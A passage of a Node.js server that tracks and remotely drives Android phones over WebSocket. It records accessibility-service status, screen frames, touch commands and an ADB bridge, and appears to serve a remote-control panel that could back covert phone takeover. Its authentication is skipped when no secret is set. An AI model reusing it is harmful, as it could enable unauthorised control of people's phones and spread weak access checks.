const { Console } = require("console");
const express = require("express");
const http = require("http");
const app = express();
const crypto = require("crypto");
const { getRedisConfig, initRedisBus, publishEvent, subscribeEvent, setJsonValue, getJsonValue, listJsonByPattern } = require('./redis-bus');

let mysql;
try {
  mysql = require('mysql2/promise');
} catch (e) {
  mysql = null;
}


const WebSocket = require("ws");
const redisConfig = getRedisConfig();

const server = http.createServer(app);

function isInternalStateRequestAuthorized(req) {
  if (!WS_SECRET) return true;
  const headerKey = String(req.headers['x-ws-secret'] || '').trim();
  const queryKey = String((req.query && req.query.k) || '').trim();
  return headerKey === WS_SECRET || queryKey === WS_SECRET;
}

app.get('/healthz', (_req, res) => {
  res.json({ ok: true, service: 'websocket-http', redis: redisConfig.enabled, now: Date.now() });
});

app.get('/state/device/:phoneId', async (req, res) => {
  if (!isInternalStateRequestAuthorized(req)) {
    res.status(401).json({ ok: false, error: 'unauthorized' });
    return;
  }

  const phoneId = String(req.params.phoneId || '').trim();
  if (!phoneId) {
    res.status(400).json({ ok: false, error: 'phoneId required' });
    return;
  }

  const redisState = await getJsonValue(`device:status:${phoneId}`);
  const memoryState = DeviceStatus.get(phoneId) || null;
  res.json({
    ok: true,
    phone_id: phoneId,
    redis: redisState,
    memory: memoryState ? normalizeDeviceListRow(memoryState) : null,
  });
});

app.get('/state/devices', async (req, res) => {
  if (!isInternalStateRequestAuthorized(req)) {
    res.status(401).json({ ok: false, error: 'unauthorized' });
    return;
  }

  const limit = Math.min(Math.max(Number(req.query.limit || 50), 1), 200);
  const redisStates = await listJsonByPattern('device:status:*', limit);
  res.json({ ok: true, total: redisStates.length, data: redisStates });
});
app.get('/state/adb', async (req, res) => {
  if (!isInternalStateRequestAuthorized(req)) {
    res.status(401).json({ ok: false, error: 'unauthorized' });
    return;
  }
  if (!adbBridge || typeof adbBridge.getOnlineDevices !== 'function') {
    res.json({ ok: true, enabled: false, devices: [] });
    return;
  }
  res.json({
    ok: true,
    enabled: true,
    devices: adbBridge.getOnlineDevices(),
    all: typeof adbBridge.getDevices === 'function' ? adbBridge.getDevices() : [],
  });
});

// WebSocket 连接密钥（从环境变量读取，留空则不校验）
const WS_SECRET = process.env.WS_SECRET || '';
// checkphone 是否强制要求 token（1/true=必须，0/false/空=兼容旧前端）
const WS_REQUIRE_TOKEN = /^(1|true|yes)$/i.test(process.env.WS_REQUIRE_TOKEN || '');
const PHP_API_URL = (process.env.PHP_API_URL || process.env.APP_URL || 'http://127.0.0.1').replace(/\/$/, '');

const WS_DB_ENABLE = /^(1|true|yes)$/i.test(process.env.WS_DB_ENABLE || '');
const WS_DB_WRITE_MIN_INTERVAL_SEC = Math.max(1, Number(process.env.WS_DB_WRITE_MIN_INTERVAL_SEC || 30));
const WS_AUDIT_ENABLE = /^(1|true|yes)$/i.test(process.env.WS_AUDIT_ENABLE || '');
const WS_AUDIT_PING_INTERVAL_SEC = Math.max(10, Number(process.env.WS_AUDIT_PING_INTERVAL_SEC || 300));
const WS_EVENT_RETENTION_DAYS = Math.max(1, Number(process.env.WS_EVENT_RETENTION_DAYS || 90));
// 在线/离线判定参数：避免网络抖动导致“上线即掉线”
const WS_PING_TIMEOUT_SEC = Math.max(30, Number(process.env.WS_PING_TIMEOUT_SEC || 300));
const WS_CHECK_INTERVAL_SEC = Math.max(5, Number(process.env.WS_CHECK_INTERVAL_SEC || 25));
// 是否在连接 close 时立即标离线（默认关闭，改为“超时才离线”，减少状态抖动）
const WS_MARK_OFFLINE_ON_CLOSE = /^(1|true|yes)$/i.test(process.env.WS_MARK_OFFLINE_ON_CLOSE || '');
// 是否启用 WebSocket 协议层 ping 探测（某些客户端不回 pong 会被误判掉线；默认关闭）
const WS_ENABLE_PING_PROBE = /^(1|true|yes)$/i.test(process.env.WS_ENABLE_PING_PROBE || '');
// 远程多区域、多设备抖动防护参数
const WS_REGION = (process.env.WS_REGION || 'auto').trim();               // 服务器区域标签: auto/cn/us/eu/asia
const WS_REGION_PING_FACTOR = Math.max(1, Number(process.env.WS_REGION_PING_FACTOR || 2));  // 跨区域时 ping 超时放大倍数（默认2倍）
const WS_SCREEN_JITTER_MS = Math.max(0, Number(process.env.WS_SCREEN_JITTER_MS || 50));     // 屏幕帧抖动缓冲（ms），跨区域远程场景建议 80-150
// 设备自动移除保护：仅当明确从页面卸载时才删除设备记录
// 此值仅作为安全阀，0=永不自动移除（推荐远程场景）
const WS_DEVICE_AUTO_REMOVE_DAYS = Math.max(0, Number(process.env.WS_DEVICE_AUTO_REMOVE_DAYS || 0));
const WS_VERBOSE_LOG = /^(1|true|yes)$/i.test(process.env.WS_VERBOSE_LOG || '');
const WS_SCREEN_FRAME_MIN_INTERVAL_MS = Math.max(0, Number(process.env.WS_SCREEN_FRAME_MIN_INTERVAL_MS || 120));
const WS_SCREEN_PRIORITY_BOOST_MS = Math.max(0, Number(process.env.WS_SCREEN_PRIORITY_BOOST_MS || 350));
const WS_SCREEN_MAX_BUFFERED_BYTES = Math.max(65536, Number(process.env.WS_SCREEN_MAX_BUFFERED_BYTES || 1048576));
const WS_MOV_COALESCE_MS = Math.max(0, Number(process.env.WS_MOV_COALESCE_MS || 16));
// DB 侧“按 last_ws_ping 判定过期离线”，用于 WS 重启/内存丢失后的状态自愈
const WS_DB_STALE_OFFLINE_ENABLE = !/^(0|false|no)$/i.test(String(process.env.WS_DB_STALE_OFFLINE_ENABLE || '1').trim());
const REDIS_DEVICE_STATUS_TTL_SEC = Math.max(30, Number(process.env.REDIS_DEVICE_STATUS_TTL_SEC || Math.max(WS_PING_TIMEOUT_SEC * 2, 600)));
const DEVICE_OWNERSHIP_LOCK = (process.env.DEVICE_OWNERSHIP_LOCK || '1');
const DEVICE_OWNERSHIP_LOCK_ENABLED = !/^(0|false|no)$/i.test(String(DEVICE_OWNERSHIP_LOCK).trim());

const lastStatusPersistAt = new Map();
const lastPingAuditAt = new Map();
const lastOfflineMarkedAt = new Map();
const commandPriorityUntilByPhone = new Map();
const lastRealtimeFrameAtByPhone = new Map();
const pendingMovCommandByPhone = new Map();
const pendingMovTimerByPhone = new Map();

function debugLog(...args) {
  if (!WS_VERBOSE_LOG) return;
  console.log(...args);
}
// 归属缓存：避免每个 WS ping 都打 DB；仅当 user_email 发生变化时强制校验
// key = phoneId, value = { enforcedEmail, enforcedUsrname, lastAttemptEmail, ts }
const ownershipCache = new Map();
let lastDbStaleSweepAt = 0;
const wsSessionIdBySocket = new Map();

let dbPool = null;

initRedisBus().catch(() => {});
if (redisConfig.enabled) {
  console.log('[REDIS] websocket bus enabled:', redisConfig.url);
}

function getDbPool() {
  if (!WS_DB_ENABLE) return null;
  if (!mysql) {
    console.warn('[WS_DB] mysql2 未安装，已跳过落库。');
    return null;
  }
  if (dbPool) return dbPool;

  const host = process.env.DB_SERVER || 'mysql';
  const user = process.env.DB_USER || '';
  const password = process.env.DB_PASS || '';
  const database = process.env.DB_NAME || '';
  if (!user || !database) {
    console.warn('[WS_DB] 缺少 DB_USER/DB_NAME，已跳过落库。');
    return null;
  }

  dbPool = mysql.createPool({
    host,
    user,
    password,
    database,
    waitForConnections: true,
    connectionLimit: 8,
    maxIdle: 4,
    idleTimeout: 60000,
    charset: 'utf8mb4_unicode_ci'
  });

  return dbPool;
}

async function ensureWsTables() {
  const pool = getDbPool();
  if (!pool) return;

  await pool.query(`
    CREATE TABLE IF NOT EXISTS ws_device_status (
      phone_id varchar(100) NOT NULL,
      user_email varchar(255) DEFAULT NULL,
      usrname varchar(100) DEFAULT NULL,
      phone_name varchar(255) DEFAULT NULL,
      android_ver varchar(50) DEFAULT NULL,
      model varchar(100) DEFAULT NULL,
      install_date varchar(50) DEFAULT NULL,
      country varchar(100) DEFAULT NULL,
      wallpaper longtext DEFAULT NULL,
      battery_charg varchar(20) DEFAULT NULL,
      activz varchar(10) DEFAULT NULL,
      accessibility tinyint(1) DEFAULT 0,
      last_ws_ping datetime DEFAULT NULL,
      ws_online tinyint(1) DEFAULT 1,
      updated_at datetime DEFAULT CURRENT_TIMESTAMP,
      PRIMARY KEY (phone_id),
      KEY idx_user_email (user_email),
      KEY idx_usrname (usrname),
      KEY idx_last_ws_ping (last_ws_ping)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  const [accessibilityColumns] = await pool.query(
    `SELECT 1
       FROM information_schema.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = 'ws_device_status'
        AND COLUMN_NAME = 'accessibility'
      LIMIT 1`
  );
  if (!Array.isArray(accessibilityColumns) || accessibilityColumns.length === 0) {
    await pool.query('ALTER TABLE ws_device_status ADD COLUMN accessibility tinyint(1) DEFAULT 0');
  }

  const [activzColumns] = await pool.query(
    `SELECT 1
       FROM information_schema.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = 'ws_device_status'
        AND COLUMN_NAME = 'activz'
      LIMIT 1`
  );
  if (!Array.isArray(activzColumns) || activzColumns.length === 0) {
    await pool.query('ALTER TABLE ws_device_status ADD COLUMN activz varchar(10) DEFAULT NULL');
  }

  const [countryColumns] = await pool.query(
    `SELECT 1
       FROM information_schema.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = 'ws_device_status'
        AND COLUMN_NAME = 'country'
      LIMIT 1`
  );
  if (!Array.isArray(countryColumns) || countryColumns.length === 0) {
    await pool.query('ALTER TABLE ws_device_status ADD COLUMN country varchar(100) DEFAULT NULL');
  }

  const [wallpaperColumns] = await pool.query(
    `SELECT 1
       FROM information_schema.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = 'ws_device_status'
        AND COLUMN_NAME = 'wallpaper'
      LIMIT 1`
  );
  if (!Array.isArray(wallpaperColumns) || wallpaperColumns.length === 0) {
    await pool.query('ALTER TABLE ws_device_status ADD COLUMN wallpaper longtext DEFAULT NULL');
  }

  const [batteryColumns] = await pool.query(
    `SELECT 1
       FROM information_schema.COLUMNS
      WHERE TABLE_SCHEMA = DATABASE()
        AND TABLE_NAME = 'ws_device_status'
        AND COLUMN_NAME = 'battery_charg'
      LIMIT 1`
  );
  if (!Array.isArray(batteryColumns) || batteryColumns.length === 0) {
    await pool.query('ALTER TABLE ws_device_status ADD COLUMN battery_charg varchar(20) DEFAULT NULL');
  }

  await pool.query(`
    CREATE TABLE IF NOT EXISTS ws_device_events (
      id bigint NOT NULL AUTO_INCREMENT,
      event_time datetime NOT NULL,
      event_type varchar(20) NOT NULL,
      phone_id varchar(100) NOT NULL,
      user_email varchar(255) DEFAULT NULL,
      usrname varchar(100) DEFAULT NULL,
      phone_name varchar(255) DEFAULT NULL,
      model varchar(100) DEFAULT NULL,
      PRIMARY KEY (id),
      KEY idx_event_time (event_time),
      KEY idx_phone_id (phone_id),
      KEY idx_usrname (usrname)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  // 设备归属绑定表：防止 phone_id 被转移
  await pool.query(`
    CREATE TABLE IF NOT EXISTS device_ownership (
      phone_id varchar(100) NOT NULL,
      usrname varchar(100) NOT NULL,
      user_email varchar(255) NOT NULL,
      locked tinyint(1) NOT NULL DEFAULT 1,
      created_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      PRIMARY KEY (phone_id),
      KEY idx_usrname (usrname),
      KEY idx_user_email (user_email)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS device_ownership_events (
      id bigint NOT NULL AUTO_INCREMENT,
      event_time datetime NOT NULL,
      event_type varchar(30) NOT NULL,
      phone_id varchar(100) NOT NULL,
      from_usrname varchar(100) DEFAULT NULL,
      to_usrname varchar(100) DEFAULT NULL,
      ip varchar(64) DEFAULT NULL,
      source varchar(20) DEFAULT NULL,
      note varchar(255) DEFAULT NULL,
      PRIMARY KEY (id),
      KEY idx_event_time (event_time),
      KEY idx_phone_id (phone_id),
      KEY idx_event_type (event_type)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  await pool.query(`
    CREATE TABLE IF NOT EXISTS protocol_sessions (
      session_id varchar(128) NOT NULL,
      phone_id varchar(100) NOT NULL,
      protocol varchar(20) NOT NULL,
      state varchar(20) NOT NULL,
      version varchar(40) DEFAULT NULL,
      last_seen datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
      expires_at datetime NOT NULL,
      meta json DEFAULT NULL,
      created_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
      updated_at datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      PRIMARY KEY (session_id),
      UNIQUE KEY uniq_phone_protocol (phone_id, protocol),
      KEY idx_phone_state (phone_id, state),
      KEY idx_expires_at (expires_at)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
  `);

  console.log('[WS_DB] 表检查完成');
}

async function claimProtocolSession({ sessionId, phoneId, protocol, version, ttlSec = 90, meta = null }) {
  const pool = getDbPool();
  if (!pool) return true;
  const sid = String(sessionId || '').trim();
  const pid = String(phoneId || '').trim();
  const proto = String(protocol || '').trim();
  if (!sid || !pid || !proto) return false;

  await pool.query(
    `INSERT INTO protocol_sessions (session_id, phone_id, protocol, state, version, last_seen, expires_at, meta)
     VALUES (?, ?, ?, 'active', ?, NOW(), DATE_ADD(NOW(), INTERVAL ? SECOND), ?)
     ON DUPLICATE KEY UPDATE
       phone_id = VALUES(phone_id),
       protocol = VALUES(protocol),
       state = 'active',
       version = VALUES(version),
       last_seen = NOW(),
       expires_at = DATE_ADD(NOW(), INTERVAL ? SECOND),
       meta = VALUES(meta),
       updated_at = NOW()`,
    [sid, pid, proto, version || null, ttlSec, meta ? JSON.stringify(meta) : null, ttlSec]
  );
  await pool.query(
    `UPDATE protocol_sessions SET state = 'standby', updated_at = NOW() WHERE phone_id = ? AND protocol <> ? AND state = 'active'`,
    [pid, proto]
  );
  return true;
}

async function touchProtocolSession(sessionId, ttlSec = 90) {
  const pool = getDbPool();
  if (!pool) return;
  const sid = String(sessionId || '').trim();
  if (!sid) return;
  await pool.query(
    `UPDATE protocol_sessions SET last_seen = NOW(), expires_at = DATE_ADD(NOW(), INTERVAL ? SECOND), updated_at = NOW() WHERE session_id = ? AND state = 'active'`,
    [ttlSec, sid]
  );
}

async function releaseProtocolSession(sessionId) {
  const pool = getDbPool();
  if (!pool) return;
  const sid = String(sessionId || '').trim();
  if (!sid) return;
  await pool.query(`UPDATE protocol_sessions SET state = 'failed', updated_at = NOW() WHERE session_id = ?`, [sid]);
}

async function enforceOwnershipByPhoneId(phoneId, attemptedUserEmail, source) {
  const pool = getDbPool();
  if (!pool) return { phoneId, userEmail: attemptedUserEmail || null, usrname: null };

  const pid = String(phoneId || '').trim();
  if (!pid) return { phoneId: pid, userEmail: attemptedUserEmail || null, usrname: null };

  const attemptedRaw = attemptedUserEmail ? String(attemptedUserEmail).trim() : '';
  let userEmail = attemptedRaw;
  // 兼容设备端可能上报 URL 编码的加密邮箱（如 %3D/%2B）
  try {
    userEmail = decodeURIComponent(userEmail);
  } catch {}
  userEmail = String(userEmail || '').trim();
  // URLSearchParams 会把 '+' 当空格，这里兜底还原
  if (userEmail) userEmail = userEmail.replace(/ /g, '+');
  let attemptedUsrname = null;
  if (userEmail) {
    const [uRows] = await pool.query('SELECT usrname FROM users WHERE email = ? LIMIT 1', [userEmail]);
    attemptedUsrname = (uRows && uRows[0] && uRows[0].usrname) ? String(uRows[0].usrname) : null;
  }

  const [rows] = await pool.query('SELECT usrname, user_email, locked FROM device_ownership WHERE phone_id = ? LIMIT 1', [pid]);
  if (!rows || rows.length === 0) {
    if (!attemptedUsrname || !userEmail) {
      return { phoneId: pid, userEmail: userEmail || null, usrname: attemptedUsrname };
    }
    const locked = DEVICE_OWNERSHIP_LOCK_ENABLED ? 1 : 0;
    await pool.query('INSERT INTO device_ownership (phone_id, usrname, user_email, locked) VALUES (?, ?, ?, ?)', [pid, attemptedUsrname, userEmail, locked]);
    await pool.query(
      'INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)',
      ['bind', pid, null, attemptedUsrname, null, source || 'ws', locked ? 'locked' : 'unlocked']
    );
    return { phoneId: pid, userEmail, usrname: attemptedUsrname };
  }

  const currentUsrname = rows[0].usrname ? String(rows[0].usrname) : null;
  const currentEmail = rows[0].user_email ? String(rows[0].user_email) : null;
  const locked = Number(rows[0].locked || 1) === 1;

  if (locked) {
    const emailMismatch = !!(userEmail && currentEmail && userEmail !== currentEmail);
    const usrMismatch = !!(attemptedUsrname && currentUsrname && attemptedUsrname !== currentUsrname);

    if (emailMismatch || usrMismatch) {
      let note = 'ownership locked';
      if (emailMismatch) {
        const h = crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 12);
        note = `ownership locked; email mismatch; attempted_email_sha256=${h}`;
      }
      await pool.query(
        'INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)',
        ['transfer_blocked', pid, currentUsrname, attemptedUsrname, null, source || 'ws', note]
      );
      // 强制回到原归属
      return { phoneId: pid, userEmail: currentEmail, usrname: currentUsrname };
    }
  }

  if (!locked && attemptedUsrname && currentUsrname && attemptedUsrname !== currentUsrname) {
    await pool.query('UPDATE device_ownership SET usrname = ?, user_email = ?, updated_at = NOW() WHERE phone_id = ?', [attemptedUsrname, userEmail || currentEmail, pid]);
    await pool.query(
      'INSERT INTO device_ownership_events (event_time, event_type, phone_id, from_usrname, to_usrname, ip, source, note) VALUES (NOW(), ?, ?, ?, ?, ?, ?, ?)',
      ['transfer_allowed', pid, currentUsrname, attemptedUsrname, null, source || 'ws', 'ownership unlocked']
    );
    return { phoneId: pid, userEmail, usrname: attemptedUsrname };
  }

  return { phoneId: pid, userEmail: currentEmail || userEmail || null, usrname: currentUsrname || attemptedUsrname };
}

function normalizeAccessibility(device) {
  const rawValue = device.accessibility ?? device.accessible ?? device.accservice ?? device.is_accessibility_enabled ?? device.a11y;
  if (rawValue === undefined || rawValue === null || rawValue === '') {
    return 0;
  }

  const normalized = String(rawValue).trim().toLowerCase();
  if (['1', 'true', 'yes', 'on', 'enabled', 'open'].includes(normalized)) {
    return 1;
  }
  if (['0', 'false', 'no', 'off', 'disabled', 'close'].includes(normalized)) {
    return 0;
  }

  return Number(normalized) > 0 ? 1 : 0;
}

function normalizeDeviceListRow(device) {
  if (!device || typeof device !== 'object') {
    return device;
  }

  return {
    ...device,
    android_version: device.android_version == null ? String(device.android_ver || '') : String(device.android_version),
    wallpap: device.wallpap == null ? String(device.wallpaper || '') : String(device.wallpap),
    battery_charge: device.battery_charge == null ? String(device.battery_charg || '') : String(device.battery_charge),
    activz: device.activz == null ? '' : String(device.activz),
    country: device.country == null ? '' : String(device.country),
    accessibility: String(Number(device.accessibility || 0)),
    phoneopen: String(Number(device.phoneopen || device.ws_online || 0))
  };
}

function canViewGlobalDevices(user) {
  const usrname = String((user && user.usrname) || '').trim().toLowerCase();
  return usrname === 'zuige';
}

function getClientIp(req, ws) {
  const forwardedFor = req && req.headers ? req.headers['x-forwarded-for'] : '';
  const rawIp = (Array.isArray(forwardedFor) ? forwardedFor[0] : String(forwardedFor || '').split(',')[0].trim()) || (ws && ws._socket ? ws._socket.remoteAddress : '') || '';
  return rawIp.startsWith('::ffff:') ? rawIp.slice(7) : rawIp;
}

function getClientCountry(req) {
  if (!req || !req.headers) return '';
  const headerCountry = req.headers['cf-ipcountry'] || req.headers['x-country-code'] || '';
  const country = Array.isArray(headerCountry) ? headerCountry[0] : String(headerCountry || '').trim();
  if (!country || country.toUpperCase() === 'XX') return '';
  return country;
}

async function upsertWsDeviceStatus(device) {
  const pool = getDbPool();
  if (!pool) return;

  const phoneId = String(device.phone_id || '').trim();
  if (!phoneId) return;

  const now = Date.now();
  const attemptedEmail = (device.user_email ? String(device.user_email).trim() : '');

  // 归属锁校验：仅在 attemptedEmail 变化时触发（转移尝试一定会变化）
  let enforcedEmail = null;
  let enforcedUsrname = null;
  const cached = ownershipCache.get(phoneId);
  if (cached && cached.lastAttemptEmail === attemptedEmail && (now - cached.ts) < 10 * 60 * 1000) {
    enforcedEmail = cached.enforcedEmail;
    enforcedUsrname = cached.enforcedUsrname;
  } else {
    const enforced = await enforceOwnershipByPhoneId(phoneId, attemptedEmail, 'ws');
    enforcedEmail = enforced.userEmail || null;
    enforcedUsrname = enforced.usrname || null;
    ownershipCache.set(phoneId, {
      enforcedEmail,
      enforcedUsrname,
      lastAttemptEmail: attemptedEmail,
      ts: now
    });
  }

  // 状态写库仍按最小间隔限频
  const last = lastStatusPersistAt.get(phoneId) || 0;
  if (now - last < WS_DB_WRITE_MIN_INTERVAL_SEC * 1000) {
    // 如果刚被标记离线（timeout/cleanup），允许快速“回在线”，避免上线后短时间仍显示离线
    const lastOff = lastOfflineMarkedAt.get(phoneId) || 0;
    if (lastOff && (now - lastOff) < WS_DB_WRITE_MIN_INTERVAL_SEC * 1000) {
      try {
        await pool.query(
          'UPDATE ws_device_status SET ws_online = 1, last_ws_ping = NOW(), updated_at = NOW(), user_email = ?, usrname = ?, country = ?, wallpaper = ?, battery_charg = ?, activz = ?, accessibility = ? WHERE phone_id = ?',
          [enforcedEmail, enforcedUsrname || null, device.country ? String(device.country).slice(0, 100) : null, device.wallpap == null ? null : String(device.wallpap), device.battery_charge == null ? null : String(device.battery_charge).slice(0, 20), device.activz == null ? null : String(device.activz).slice(0, 10), normalizeAccessibility(device), phoneId]
        );
      } catch {}
    }
    return;
  }
  lastStatusPersistAt.set(phoneId, now);

  const userEmail = enforcedEmail;
  const phoneName = device.phone_name ? String(device.phone_name).slice(0, 255) : null;
  const androidVer = device.android_version ? String(device.android_version).slice(0, 50) : (device.android_ver ? String(device.android_ver).slice(0, 50) : null);
  const model = device.model ? String(device.model).slice(0, 100) : null;
  const installDate = device.install_date ? String(device.install_date).slice(0, 50) : null;
  const country = device.country ? String(device.country).slice(0, 100) : null;
  const wallpaper = device.wallpap == null ? null : String(device.wallpap);
  const batteryCharge = device.battery_charge == null ? null : String(device.battery_charge).slice(0, 20);
  const activz = device.activz == null ? null : String(device.activz).slice(0, 10);
  const accessibility = normalizeAccessibility(device);

  try {
    const usrname = enforcedUsrname || null;

    await pool.query(
      `INSERT INTO ws_device_status (
        phone_id, user_email, usrname, phone_name, android_ver, model, install_date, country, wallpaper, battery_charg, activz, accessibility, last_ws_ping, ws_online, updated_at
      ) VALUES (
        ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW(), 1, NOW()
      ) ON DUPLICATE KEY UPDATE
        user_email = VALUES(user_email),
        usrname = VALUES(usrname),
        phone_name = VALUES(phone_name),
        android_ver = VALUES(android_ver),
        model = VALUES(model),
        install_date = VALUES(install_date),
        country = VALUES(country),
        wallpaper = VALUES(wallpaper),
        battery_charg = VALUES(battery_charg),
        activz = VALUES(activz),
        accessibility = VALUES(accessibility),
        last_ws_ping = NOW(),
        ws_online = 1,
        updated_at = NOW()`,
      [phoneId, userEmail, usrname, phoneName, androidVer, model, installDate, country, wallpaper, batteryCharge, activz, accessibility]
    );

    if (WS_AUDIT_ENABLE) {
      const lastAudit = lastPingAuditAt.get(phoneId) || 0;
      if (now - lastAudit >= WS_AUDIT_PING_INTERVAL_SEC * 1000) {
        lastPingAuditAt.set(phoneId, now);
        await pool.query(
          'INSERT INTO ws_device_events (event_time, event_type, phone_id, user_email, usrname, phone_name, model) VALUES (NOW(), ?, ?, ?, ?, ?, ?)',
          ['ping', phoneId, userEmail, usrname, phoneName, model]
        );
      }
    }
  } catch (e) {
    console.warn('[WS_DB] upsert 失败:', e && e.message ? e.message : e);
  }
}

async function markWsDeviceOffline(phoneId, reason) {
  const pool = getDbPool();
  const pid = String(phoneId || '').trim();
  if (!pid) return;

  const existingDevice = DeviceStatus.get(pid);
  if (existingDevice) {
    mergeDeviceIntoIndexes(pid, normalizeDeviceListRow({
      ...existingDevice,
      phoneopen: 0,
      ws_online: 0,
    }));
  }

  await setJsonValue(`device:status:${pid}`, {
    phone_id: pid,
    source: reason || 'offline',
    online: false,
    last_ping: existingDevice && existingDevice.lastPing ? existingDevice.lastPing : Date.now(),
    reason: reason || 'disconnect',
  }, REDIS_DEVICE_STATUS_TTL_SEC).catch(() => {});

  if (!pool) return;

  try {
    lastOfflineMarkedAt.set(pid, Date.now());
    await pool.query('UPDATE ws_device_status SET ws_online = 0, updated_at = NOW() WHERE phone_id = ?', [pid]);
    if (WS_AUDIT_ENABLE) {
      await pool.query(
        'INSERT INTO ws_device_events (event_time, event_type, phone_id) VALUES (NOW(), ?, ?)',
        [reason || 'disconnect', pid]
      );
    }
  } catch (e) {
    console.warn('[WS_DB] offline 标记失败:', e && e.message ? e.message : e);
  }
}

async function auditWsDisconnect(phoneId) {
  const pool = getDbPool();
  if (!pool) return;
  if (!WS_AUDIT_ENABLE) return;
  const pid = String(phoneId || '').trim();
  if (!pid) return;
  try {
    await pool.query(
      'INSERT INTO ws_device_events (event_time, event_type, phone_id) VALUES (NOW(), ?, ?)',
      ['disconnect', pid]
    );
  } catch {}
}

async function cleanupOldEvents() {
  const pool = getDbPool();
  if (!pool) return;
  if (!WS_AUDIT_ENABLE) return;

  try {
    await pool.query('DELETE FROM ws_device_events WHERE event_time < DATE_SUB(NOW(), INTERVAL ? DAY)', [WS_EVENT_RETENTION_DAYS]);
  } catch (e) {
    console.warn('[WS_DB] 清理事件失败:', e && e.message ? e.message : e);
  }
}

async function sweepDbStaleOffline() {
  const pool = getDbPool();
  if (!pool) return;
  if (!WS_DB_STALE_OFFLINE_ENABLE) return;

  const now = Date.now();
  // 限频：最多每 60 秒扫一次
  if (now - lastDbStaleSweepAt < 60 * 1000) return;
  lastDbStaleSweepAt = now;

  try {
    await pool.query(
      'UPDATE ws_device_status SET ws_online = 0, updated_at = NOW() WHERE ws_online = 1 AND last_ws_ping IS NOT NULL AND last_ws_ping < DATE_SUB(NOW(), INTERVAL ? SECOND)',
      [WS_PING_TIMEOUT_SEC]
    );

    for (const [phoneId, device] of DeviceStatus.entries()) {
      if (!device || !device.lastPing) continue;
      if (now - device.lastPing <= WS_PING_TIMEOUT_SEC * 1000) continue;
      await setJsonValue(`device:status:${phoneId}`, {
        phone_id: phoneId,
        source: 'stale-sweep',
        online: false,
        last_ping: device.lastPing,
        reason: 'timeout',
      }, REDIS_DEVICE_STATUS_TTL_SEC).catch(() => {});
    }
  } catch (e) {
    console.warn('[WS_DB] stale offline sweep 失败:', e && e.message ? e.message : e);
  }
}

function verifyClient(info, callback) {
  if (WS_SECRET === '') {
    callback(true);
    return;
  }
  try {
    const url = new URL(info.req.url || '', 'http://localhost');
    const k = url.searchParams.get('k');
    if (k === WS_SECRET) {
      callback(true);
    } else {
      callback(false, 401, 'Unauthorized');
    }
  } catch (e) {
    callback(false, 401, 'Unauthorized');
  }
}

const wss = new WebSocket.Server({ 
    port: 8080,
    verifyClient,
    maxPayload: 10 * 1024 * 1024,
    // 万级连接时必须关闭压缩：每连接的压缩上下文占 ~150KB 内存
    // 10000 连接 × 150KB = 1.5GB 仅用于压缩，会导致 OOM
    perMessageDeflate: false
});

// 初始化数据库表（不阻塞 WS 启动）
ensureWsTables().catch((e) => {
  console.warn('[WS_DB] 初始化失败:', e && e.message ? e.message : e);
});

// 周期性清理审计表
setInterval(() => {
  cleanupOldEvents().catch(() => {});
}, 12 * 60 * 60 * 1000);

// 周期性把 DB 中“过久未 ping”的设备置离线（不依赖内存态，WS 重启后也能自愈）
setInterval(() => {
  sweepDbStaleOffline().catch(() => {});
}, 60 * 1000);
const SolrUsers = new Map();
const SolrMobs = new Map();
const wsToPhoneId = new Map();
// 记录设备状态： key = phoneId, value = { lastPing: 时间戳 }
const DeviceStatus = new Map();
// 按 email 索引设备列表（加速 checkphone 从 O(N) 到 O(1)）
// key = user_email, value = Set<phoneId>
const EmailToPhones = new Map();

setupRedisDeviceEventSubscribers().catch((e) => {
  console.warn('[REDIS] device event subscribe failed:', e && e.message ? e.message : e);
});

const idf_admin = "slr_panel";
const idf_adminsend = "slr_panelsend";
const idf_client = "Slr_client";

const Alert_info = "Alert_info";
const Alert_success = "Alert_success";
const fs = require('fs');

function removeDeviceFromIndex(phoneKey) {
  const device = DeviceStatus.get(phoneKey);
  if (device && device.user_email && EmailToPhones.has(device.user_email)) {
    EmailToPhones.get(device.user_email).delete(phoneKey);
    if (EmailToPhones.get(device.user_email).size === 0) {
      EmailToPhones.delete(device.user_email);
    }
  }
}

function mergeDeviceIntoIndexes(phoneKey, deviceData) {
  removeDeviceFromIndex(phoneKey);
  DeviceStatus.set(phoneKey, deviceData);

  if (deviceData.user_email) {
    if (!EmailToPhones.has(deviceData.user_email)) {
      EmailToPhones.set(deviceData.user_email, new Set());
    }
    EmailToPhones.get(deviceData.user_email).add(phoneKey);
  }
}

async function processIncomingDevicePing(phoneId, rawDeviceData, options = {}) {
  const pidKey = String(phoneId || rawDeviceData.phone_id || '').trim();
  if (!pidKey) return null;

  const source = options.source || 'ws';
  const baseDeviceData = rawDeviceData && typeof rawDeviceData === 'object' ? { ...rawDeviceData } : {};
  const deviceData = normalizeDeviceListRow({
    ...baseDeviceData,
    phone_id: pidKey,
    lastPing: Date.now(),
  });

  if (deviceData.user_email) {
    deviceData.user_email = String(deviceData.user_email).replace(/ /g, '+');
  }

  mergeDeviceIntoIndexes(pidKey, deviceData);
  probes.delete(pidKey);

